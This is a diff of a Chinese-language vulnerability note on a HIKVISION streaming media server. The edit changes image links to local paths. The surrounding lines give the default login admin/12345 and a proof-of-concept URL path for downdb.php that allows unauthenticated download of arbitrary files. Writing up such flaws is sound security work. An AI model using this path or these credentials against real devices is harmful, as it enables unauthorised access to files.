@@ -20,7 +20,7 @@ HIKVISION 联网网关，流媒体管理服务器
 
 默认密码：`admin/12345`
 
-![image-20220519174002167](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191740359.png)
+![image-20220519174002167](./images/202205191740359.png)
 
 出现漏洞的代码文件为downdb.php，可以未授权下载任意文件：
 
@@ -54,4 +54,4 @@ POC：
 /localDomain/downdb.php?fileName=web/html/localDomain/downdb.php
 ```
 
-![image-20220519174022222](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191740299.png)
+![image-20220519174022222](./images/202205191740299.png)
